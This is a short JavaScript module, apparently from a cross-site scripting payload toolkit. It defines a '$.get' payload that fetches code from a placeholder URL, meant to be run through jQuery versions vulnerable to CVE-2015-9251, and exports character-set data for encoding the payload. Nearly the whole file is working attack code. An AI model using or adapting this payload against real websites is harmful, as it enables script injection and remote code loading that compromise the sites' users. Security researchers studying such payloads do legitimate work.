import generateCharsets from '../lib/charsets/generate.js'
import renderable from '../lib/renderable.js'

const script = '$.get("$$PAYLOAD_URL$$")'

export default {
    description: `Revised JQuery Get, depends on a version of JQuery with CVE-2015-9251`,
    script: renderable(script),
    charsets: generateCharsets(script)
}

